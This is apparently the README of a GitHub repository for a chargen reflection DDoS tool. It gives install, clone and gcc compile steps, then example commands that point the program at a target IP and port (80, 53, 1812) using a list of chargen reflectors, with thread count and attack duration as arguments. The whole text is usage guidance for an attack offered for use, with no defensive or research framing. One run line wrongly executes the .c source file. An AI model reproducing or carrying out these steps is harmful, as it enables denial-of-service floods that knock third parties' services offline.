# DDOS-Attack-Chargen-Stable-Version
Chargen.c

-requirements:gcc package 
 apt-get update 
apt-get install gcc

-git clone https://github.com/Dev0uss/DDOS-Attack-Chargen-Stable-Version

-cd DDOS-Attack-Chargen-Stable-Version
 
-Compilation:

gcc -pthread Chargen.c -o chargen

-Execute:

./Chargen.c IP 1812 chargen.txt 2 -1 3600

Other Examples:
# ./Chargen TEST-IP 80 chargenliste.txt 2 -1 3600
# ./Chargen TEST-IP 80 chargenliste.txt 1 -1 120
# ./Chargen DNS-IP 53 chargenliste.txt 1 -1 120
